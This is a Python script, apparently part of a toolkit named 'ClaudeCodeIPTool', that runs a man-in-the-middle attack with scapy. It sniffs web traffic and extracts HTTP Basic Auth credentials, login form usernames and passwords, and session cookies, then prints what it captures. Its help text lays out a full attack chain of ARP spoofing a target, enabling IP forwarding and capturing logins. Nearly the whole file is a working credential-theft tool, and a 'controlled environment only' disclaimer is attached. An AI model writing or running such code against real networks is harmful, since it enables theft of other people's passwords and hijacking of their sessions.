#!/usr/bin/env python3
"""
MITM Suite - ClaudeCodeIPTool
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Full man-in-the-middle attack toolkit:
- SSL stripping (downgrade HTTPS → HTTP)
- Credential capture (HTTP Basic Auth, POST forms)
- Session hijacking (steal cookies)
- Packet modification/injection

Requires: ARP spoofing active (arp-spoof.py)

CONTROLLED ENVIRONMENT ONLY - VDT baseline v2.1 applies.
"""

import argparse
import re
from scapy.all import (
    IP, TCP, Raw, sniff, send, conf
)
from collections import defaultdict

conf.verb = 0


class MITMSuite:
    """Complete MITM attack suite"""

    def __init__(self, interface=None, verbose=False):
        self.interface = interface or conf.iface
        self.verbose = verbose
        self.captured_creds = []
        self.captured_cookies = []
        self.packet_count = 0

    def log(self, msg, level="INFO"):
        if self.verbose or level in ["CAPTURE", "RESULT"]:
            prefix = {
                "CAPTURE": "[💀]",
                "RESULT": "[+]",
                "INFO": "[*]",
            }.get(level, "[ ]")
            print(f"{prefix} {msg}")

    def extract_http_credentials(self, payload):
        """Extract credentials from HTTP traffic"""
        try:
            payload_str = payload.decode('utf-8', errors='ignore')

            # HTTP Basic Auth
            auth_match = re.search(r'Authorization: Basic ([A-Za-z0-9+/=]+)', payload_str)
            if auth_match:
                import base64
                try:
                    creds = base64.b64decode(auth_match.group(1)).decode('utf-8')
                    return {'type': 'HTTP Basic Auth', 'data': creds}
                except:
                    pass

            # POST form credentials
            if 'POST' in payload_str:
                # Common credential field names
                user_match = re.search(r'(username|user|email)=([^&\s]+)', payload_str, re.I)
                pass_match = re.search(r'(password|pass|pwd)=([^&\s]+)', payload_str, re.I)

                if user_match and pass_match:
                    return {
                        'type': 'POST Form',
                        'username': user_match.group(2),
                        'password': pass_match.group(2)
                    }

        except Exception as e:
            if self.verbose:
                self.log(f"Credential extraction error: {e}", "DEBUG")

        return None

    def extract_cookies(self, payload):
        """Extract session cookies"""
        try:
            payload_str = payload.decode('utf-8', errors='ignore')

            # Extract Set-Cookie headers
            cookies = re.findall(r'Set-Cookie: ([^;\r\n]+)', payload_str, re.I)
            if cookies:
                return cookies

            # Extract Cookie headers (client → server)
            cookie_header = re.search(r'Cookie: ([^\r\n]+)', payload_str, re.I)
            if cookie_header:
                return [cookie_header.group(1)]

        except Exception:
            pass

        return []

    def ssl_strip_detector(self, payload):
        """Detect HTTPS URLs for potential SSL stripping"""
        try:
            payload_str = payload.decode('utf-8', errors='ignore')

            https_urls = re.findall(r'https://[^\s\'"<>]+', payload_str)
            if https_urls:
                return https_urls

        except Exception:
            pass

        return []

    def process_packet(self, pkt):
        """Process intercepted packet"""
        if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
            return

        self.packet_count += 1
        payload = pkt[Raw].load

        # Extract credentials
        creds = self.extract_http_credentials(payload)
        if creds:
            self.captured_creds.append({
                'src': pkt[IP].src,
                'dst': pkt[IP].dst,
                'creds': creds
            })
            self.log(f"Credentials captured from {pkt[IP].src}", "CAPTURE")
            self.log(f"  {creds}", "CAPTURE")

        # Extract cookies
        cookies = self.extract_cookies(payload)
        if cookies:
            for cookie in cookies:
                self.captured_cookies.append({
                    'src': pkt[IP].src,
                    'dst': pkt[IP].dst,
                    'cookie': cookie
                })
                if self.verbose:
                    self.log(f"Cookie: {cookie[:50]}...", "CAPTURE")

        # Detect SSL strip opportunities
        https_urls = self.ssl_strip_detector(payload)
        if https_urls and self.verbose:
            self.log(f"SSL strip opportunity: {https_urls[0]}", "INFO")

    def start(self):
        """Start MITM capture"""
        self.log(f"MITM Suite started on {self.interface}", "RESULT")
        self.log("Capturing: credentials, cookies, sessions", "INFO")
        self.log("Press Ctrl+C to stop and show results", "INFO")
        print()

        try:
            sniff(
                iface=self.interface,
                prn=self.process_packet,
                store=0,
                filter="tcp port 80 or tcp port 443"
            )
        except KeyboardInterrupt:
            self.show_results()

    def show_results(self):
        """Display captured data"""
        print("\n" + "=" * 70)
        print("MITM CAPTURE RESULTS")
        print("=" * 70)

        print(f"\nPackets processed: {self.packet_count}")
        print(f"Credentials captured: {len(self.captured_creds)}")
        print(f"Cookies captured: {len(self.captured_cookies)}")

        if self.captured_creds:
            print("\n" + "-" * 70)
            print("CAPTURED CREDENTIALS")
            print("-" * 70)
            for i, item in enumerate(self.captured_creds, 1):
                print(f"\n[{i}] {item['src']} → {item['dst']}")
                print(f"    Type: {item['creds']['type']}")
                if item['creds']['type'] == 'HTTP Basic Auth':
                    print(f"    Data: {item['creds']['data']}")
                else:
                    print(f"    Username: {item['creds'].get('username', 'N/A')}")
                    print(f"    Password: {item['creds'].get('password', 'N/A')}")

        if self.captured_cookies:
            print("\n" + "-" * 70)
            print(f"CAPTURED COOKIES (showing first 10)")
            print("-" * 70)
            for i, item in enumerate(self.captured_cookies[:10], 1):
                print(f"[{i}] {item['src']} → {item['dst']}")
                print(f"    {item['cookie'][:100]}")

        print("\n" + "=" * 70 + "\n")


def main():
    parser = argparse.ArgumentParser(
        description="MITM Suite - Credential capture, SSL stripping, session hijacking",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic credential capture
  sudo python3 mitm-suite.py

  # Verbose mode (see all cookies, SSL strip opportunities)
  sudo python3 mitm-suite.py -v

Full Attack Chain:
  1. ARP spoof target (make traffic route through you)
     sudo python3 arp-spoof.py spoof 192.168.1.100 --spoof-ip 192.168.1.1

  2. Enable IP forwarding (relay traffic)
     sudo sysctl -w net.ipv4.ip_forward=1

  3. Start MITM suite (capture credentials)
     sudo python3 mitm-suite.py -v

  4. Wait for target to browse HTTP sites
     Credentials automatically captured and displayed

What Gets Captured:
  - HTTP Basic Auth credentials
  - POST form login data (username/password)
  - Session cookies
  - HTTPS downgrade opportunities

CONTROLLED ENVIRONMENT ONLY - Unauthorized interception is illegal.
        """
    )

    parser.add_argument('--interface', help='Network interface')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output (show all captures)')

    args = parser.parse_args()

    suite = MITMSuite(args.interface, args.verbose)
    suite.start()


if __name__ == "__main__":
    main()
